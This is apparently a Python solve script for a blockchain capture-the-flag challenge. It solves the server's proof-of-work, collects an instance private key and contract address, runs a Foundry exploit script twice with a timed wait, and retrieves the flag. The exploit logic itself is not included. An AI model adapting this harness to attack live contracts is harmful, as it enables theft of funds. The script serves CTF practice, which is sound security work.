import hashlib
import json
import os
import subprocess
import time
from pwn import remote
from web3 import Web3

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "31337")

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recvuntil(b"action? ")
r.sendline(b"1")

def cast_call(addr: str, sig: str) -> str:
    # use cast instead of web3py because it's easier
    env = os.environ.copy()
    env['SETUP'] = land_addr
    res = subprocess.run(
        [
            "cast",
            "call",
            addr,
            sig,
            "--rpc-url",
            rpc_url,
        ],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    return res.stdout.decode().strip()

def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


solve_pow(r)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode().replace("TODO", CHALLENGE_HOST)
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"your address:")
player_addr = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
land_addr = r.recvline().strip().decode()
r.close()

web3 = Web3(Web3.HTTPProvider(rpc_url))

env=os.environ.copy()
env.update({"SETUP":land_addr})
res = subprocess.run(
    [
        "forge",
        "script",
        "ExploitScript",
        "-s",
        "run()",
        "--broadcast",
        "--private-key",
        private_key,
        "--rpc-url",
        rpc_url,
        "--with-gas-price",
        "0",
        "--priority-gas-price",
        "0",
    ],
    env=env,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
print(res.stdout.decode())
print(res.stderr.decode())

time.sleep(60*5+10)
# dummy tx for increase time
res = subprocess.run(["cast","send",player_addr,"--rpc-url",rpc_url,"--private-key",private_key,"--value","0","--gas-price","0","--priority-gas-price","0"],env=env,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
print(res.stdout.decode())
print(res.stderr.decode())
res = subprocess.run(
    [
        "forge",
        "script",
        "ExploitScript",
        "-s",
        "run2()",
        "--broadcast",
        "--private-key",
        private_key,
        "--rpc-url",
        rpc_url,
        "--with-gas-price",
        "0",
        "--priority-gas-price",
        "0",
    ],
    env=env,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
print(res.stdout.decode())
print(res.stderr.decode())

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.sendline(b"3")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: ")
print(r.recvline().strip().decode())
r.interactive()